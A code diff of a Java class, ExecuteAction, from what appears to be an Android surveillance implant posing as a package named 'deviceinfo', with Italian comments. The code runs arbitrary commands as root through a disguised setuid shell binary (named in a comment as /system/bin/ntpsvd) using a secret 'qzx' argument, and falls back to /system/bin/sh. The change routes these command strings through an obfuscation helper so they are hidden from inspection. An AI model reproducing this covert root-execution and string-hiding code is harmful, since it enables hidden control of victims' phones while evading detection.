@@ -9,29 +9,17 @@
 
 package com.android.deviceinfo.action;
 
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.io.OutputStream;
-import java.io.PrintWriter;
-import java.util.ArrayList;
-
-import android.text.TextUtils.StringSplitter;
-
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Trigger;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfAction;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.conf.ConfigurationException;
-import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.file.Directory;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
 import com.android.deviceinfo.util.ExecuteResult;
 import com.android.deviceinfo.util.StreamGobbler;
-import com.android.deviceinfo.util.WChar;
+import com.android.m.M;
 
 
 // TODO: Aggiungere parse $dir$, verificare chmod
@@ -107,7 +95,7 @@ public class ExecuteAction extends SubActionSlow {
 		try {
 			//a_0=/system/bin/ntpsvd
 			// 35_0=qzx
-			String cmd = String.format("%s %s %s", Configuration.shellFile, Messages.getString("35_0"), command ); // EXPORT
+			String cmd = String.format("%s %s %s", Configuration.shellFile, M.e("qzx"), command ); // EXPORT
 			ExecuteResult ret = Execute.execute(cmd);
 			
 			if (Cfg.DEBUG) {
@@ -165,7 +153,7 @@ public class ExecuteAction extends SubActionSlow {
 	public static boolean executeOrigin(String command) {
 		// Proviamo ad eseguire il comando da root
 		try {
-			String cmd[] = { Configuration.shellFile, Messages.getString("35_0"), command }; // EXPORT
+			String cmd[] = { Configuration.shellFile, M.e("qzx"), command }; // EXPORT
 			Process p = Runtime.getRuntime().exec(cmd);
 
 			p.waitFor();
@@ -183,7 +171,7 @@ public class ExecuteAction extends SubActionSlow {
 
 		// Proviamo ad eseguire il comando da utente normale
 		try {
-			String cmd[] = { Messages.getString("35_1"), "-c", command }; // EXPORT
+			String cmd[] = { M.e("/system/bin/sh"), "-c", command }; // EXPORT
 			Process p = Runtime.getRuntime().exec(cmd);
 
 			p.waitFor();
